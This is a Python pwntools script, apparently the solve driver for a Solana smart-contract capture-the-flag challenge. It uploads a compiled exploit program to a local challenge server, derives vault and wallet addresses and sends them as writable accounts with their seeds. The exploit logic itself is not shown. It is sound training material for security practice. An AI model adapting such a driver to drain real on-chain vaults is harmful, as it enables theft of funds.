#!/usr/bin/env python3

from pwn import *
from solana import *

from solana.publickey import PublicKey

HOST, PORT = "localhost:1337".split(":")
filename = os.path.join(os.path.dirname(os.path.abspath(__file__)), "solution/dist/solution.so")

class Pubkey(object):
    
    def __init__(self: object, pubkey: bytes, seed: int = 0) -> object:
        self.pubkey = pubkey.decode()
        self.seed = p8(seed)


def initialize_pubkeys() -> dict:
    return {
        "system": Pubkey(b"11111111111111111111111111111111"),
        "clock": Pubkey(b"SysvarC1ock11111111111111111111111111111111")
    }

def generate_pubkeys(program_pubkey: str, solve_pubkey: str) -> dict:
    vault_pubkey, vault_seed = PublicKey.find_program_address([b"vault"], PublicKey(program_pubkey))
    wallet_pubkey, wallet_seed = PublicKey.find_program_address([b"wallet"], PublicKey(program_pubkey))
    solve_pubkey, solve_seed = PublicKey.find_program_address([], PublicKey(solve_pubkey))

    return {
        "vault": Pubkey(vault_pubkey.to_base58(), vault_seed),
        "wallet": Pubkey(wallet_pubkey.to_base58(), wallet_seed),
        "solve": Pubkey(solve_pubkey.to_base58(), solve_seed)
    }


def start() -> object:
    return remote(args.HOST or HOST, args.PORT or PORT)

data = b""
with open(filename, "rb") as contract:
    data = contract.read()

itob = lambda _: str(_).encode()

io = start()

log.info("#0x0: sending smart contract")
io.sendlineafter(b"length:", itob(len(data)))
io.send(data)

log.info("#0x1: receiving public keys")
io.recvline()
pubkeys = initialize_pubkeys()
for i in range(3):
    name = io.recvuntil(b" pubkey: ", drop=True).decode()
    pubkey = io.recvline().strip()
    pubkeys[name] = Pubkey(pubkey)
pubkeys.update(generate_pubkeys(pubkeys["program"].pubkey, pubkeys["solve"].pubkey))

log.info("#0x2: preparing accounts")
accounts = list()

account_names = {
    "system": "r",
    "clock": "r",
    "user": "ws",
    "vault": "w",
    "program": "r",
    "wallet": "w",
    "solve": "r"
}

for name in account_names:
    accounts.append((account_names[name], pubkeys[name].pubkey))

accounts_len = len(accounts)
io.sendline(itob(accounts_len))

for i in range(accounts_len):
    io.sendline(f"{accounts[i][0]} {accounts[i][1]}".encode())

log.info("#0x3: preparing instruction")
instr = pubkeys["vault"].seed + pubkeys["wallet"].seed + pubkeys["solve"].seed
instr_len = len(instr)
io.sendline(itob(instr_len))
io.sendline(instr)

print(io.recvall(timeout=1).decode("utf-8"))
